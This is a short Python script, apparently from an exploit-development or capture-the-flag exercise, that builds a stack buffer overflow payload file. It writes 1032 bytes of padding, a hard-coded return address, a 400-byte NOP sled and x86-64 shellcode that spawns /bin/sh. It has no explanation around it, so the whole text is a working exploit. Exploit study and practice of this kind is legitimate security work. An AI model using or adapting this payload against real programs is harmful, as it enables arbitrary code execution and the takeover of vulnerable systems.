import struct, os

def dq(v):
    return struct.pack("Q", v)
with open("payload", "wb") as f:
    f.write("A" * 1032)
    #f.write(dq(0x7fffffffb5b0))
    f.write(dq(0x7fffffffb660))
    f.write("\x90"*400)
    f.write("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
